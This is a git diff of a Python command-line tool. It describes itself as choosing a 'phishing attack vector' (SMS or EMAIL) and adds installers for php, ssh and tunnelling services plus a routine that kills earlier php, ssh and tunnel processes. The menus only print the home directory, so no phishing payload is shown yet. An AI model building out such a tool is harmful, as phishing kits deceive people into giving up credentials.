@@ -17,7 +17,7 @@ from subprocess import (
     call,
     run
 )  
-from os import popen
+from os import popen, kill
 import click
 import json
 from typing import List
@@ -39,16 +39,28 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
+ask = f"{green}[{white}?{green}] {byellow}"
+success = f"{yellow}[{white}√{yellow}] {green}"
+error = f"{blue}[{white}√{yellow}] {green}"
+info  =   f"{yellow}[{white}+{yellow}] {cyan}"
+info2  =   f"{green}[{white}•{green}] {purple}"
+
+packages = [ "php", "ssh" ]
+modules = [ "requests", "bs4", "rich" ]
+tunnelers = [ "cloudflared", "loclx" ]
+processes = [ "php", "ssh", "cloudflared", "loclx", "localxpose" ]
+
+
 home_dir = popen("echo $HOME").read()
-fancy = False
+slow_text = False
 
 @click.command()
 @click.option("--mode","-m","mode", prompt="Enter the mode", help="Choose phishing attack vector", type=click.Choice(['SMS', 'EMAIL'], case_sensitive=False), required=True)
-@click.option("--cool", is_flag=True, default=False, help="Toogle fancy UI")
+@click.option("--fancy", is_flag=True, default=False, help="Toogle on slow text")
 
-def menu(mode, cool):
-    global fancy 
-    fancy = cool 
+def main_menu(mode, fancy):
+    global slow_text 
+    slow_text = fancy 
     if mode.lower() == "email":
         email_menu()
     elif mode.lower() == "sms":
@@ -60,26 +72,23 @@ def menu(mode, cool):
     
 
 def email_menu():
-    if fancy: 
-        sprint(text=f'Email! This is path to your home directory: {home_dir}', second=0.1)
-    else:
-        print(f"Email! This is the path to your home directory: {home_dir}")        
+    sprint(text=f'{ask}Email! This is path to your home directory: {home_dir}')
+    sprint(text=f'{success}Email! This is path to your home directory: {home_dir}')
+
 
 def sms_menu():
-    if fancy:
-        sprint(text=f'Sms! This is path to your home directory: {home_dir}', second=0.1)
-    else:
-        print("Sms! This is path to your home directory: {home_dir}")
-
+    sprint(text=f'{ask}Sms! This is path to your home directory: {home_dir}')
 
 # Helper functions
 
-def shell(command):
+def shell(command, capture_output=False):
     try:
-        return run(command, shell=True)
+        return run(command, shell=True, capture_output=capture_output)
     except Exception as e:
         append(e, error_file)
 
+
+# Run task in background, supressing output by setting stdout and stderr to devnull
 def silent_shell(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
     try:
         return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
@@ -92,11 +101,19 @@ def append(file_name, text):
         file.write(str(text) + "\n")
 
 
-def sprint(text, second=0.05):
-    for letter in text + '\n':
-        stdout.write(letter)
-        stdout.flush()
-        sleep(second)
+def sprint(text):
+    global slow_text 
+    if slow_text:
+        for letter in text + '\n':
+            stdout.write(letter)
+            stdout.flush()
+            sleep(0.05)
+    else:
+        for letter in text +'\n':
+            stdout.write(letter)
+            stdout.flush()
+            sleep(0.01)
+
 
 # Install packages
 def installer(package, package_name=None):
@@ -125,6 +142,44 @@ def installer(package, package_name=None):
         if not is_installed("localxpose"):
             shell("brew install localxpose")
 
+
+def requirements():
+    installer("php")
+    if is_installed("apt") and not is_installed("pkg"):
+        installer("ssh", "openssh-client")
+    else:
+        installer("ssh", "openssh")
+    for package in packages:
+        if not is_installed(package):
+            sprint(f"{error}{package} cannot be installed. Install it manually!{nc}")
+            exit(1)
+
+
+def is_running(process):
+    exit_code = silent_shell(f"pidof {process}").wait()
+    if exit_code == 0:
+        return True
+    return False
+
+
+# Process killer using os.kill()
+
+def killer():
+    # Previous instances of these should be stopped
+    for process in processes:
+        if is_running(process):
+            # system(f"killall {process}")
+            output = shell(f"pidof {process}", True).stdout.decode("utf-8").strip()
+            if " " in output:
+                for pid in output.split(" "):
+                    kill(int(pid), SIGINT)
+            elif output != "":
+                kill(int(output), SIGINT)
+            else:
+                print()
+
+
 if __name__ == "__main__":
-    menu()    
-    print('wtf')
+    killer()
+    main_menu()
+
